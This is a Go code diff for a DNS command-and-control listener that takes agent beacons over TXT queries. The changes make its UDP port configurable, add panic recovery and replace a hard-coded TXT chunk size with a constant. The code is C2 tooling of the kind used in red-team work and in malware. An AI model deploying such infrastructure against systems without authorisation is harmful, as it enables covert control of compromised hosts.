@@ -5,31 +5,38 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"log"
 	"log/slog"
 	"net"
+	"runtime/debug"
 	"strings"
 	"sync"
 
 	"github.com/miekg/dns"
 )
 
-// DNSBeaconListener runs a DNS C2 server on UDP :53.
+// DNSBeaconListener runs a DNS C2 server on a configurable UDP port.
 // It handles TXT-type DNS queries for agent beaconing and A-type queries for stub resolution.
 type DNSBeaconListener struct {
 	sync.Mutex
 	Domain  string // e.g. "c2.example.com"
 	ID      uint   // listener DB ID
+	Addr    string // e.g. ":53" or ":5353"
 	server  *dns.Server
 	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
 	AgentIP string
 	running bool
 }
 
-// NewDNSBeaconListener creates a DNS C2 listener
-func NewDNSBeaconListener(domain string, agentIP string, listenerID uint) *DNSBeaconListener {
+// NewDNSBeaconListener creates a DNS C2 listener bound to addr (e.g. ":53").
+func NewDNSBeaconListener(domain string, agentIP string, listenerID uint, addr string) *DNSBeaconListener {
+	if addr == "" {
+		addr = ":53"
+	}
 	return &DNSBeaconListener{
 		Domain:  domain,
 		ID:      listenerID,
+		Addr:    addr,
 		AgentIP: agentIP,
 	}
 }
@@ -51,14 +58,15 @@ func (dl *DNSBeaconListener) Start() error {
 	mux.HandleFunc(".", dl.handleQuery)
 
 	dl.server = &dns.Server{
-		Addr:    ":53",
+		Addr:    dl.Addr,
 		Net:     "udp",
 		Handler: mux,
 	}
 
 	dl.running = true
-	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", ":53")
+	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", dl.Addr)
 	go func() {
+		defer func() { if r := recover(); r != nil { log.Printf("[PANIC RECOVERED] %v\n%s", r, debug.Stack()) } }()
 		if err := dl.server.ListenAndServe(); err != nil {
 			slog.Error("DNS C2 listener failed", "error", err)
 			dl.Lock()
@@ -213,8 +221,8 @@ func addTXTRecord(m *dns.Msg, name string, value string) {
 	if value == "" {
 		value = " "
 	}
-	for i := 0; i < len(value); i += 255 {
-		end := i + 255
+	for i := 0; i < len(value); i += DNSTXTChunkSize {
+		end := i + DNSTXTChunkSize
 		if end > len(value) {
 			end = len(value)
 		}
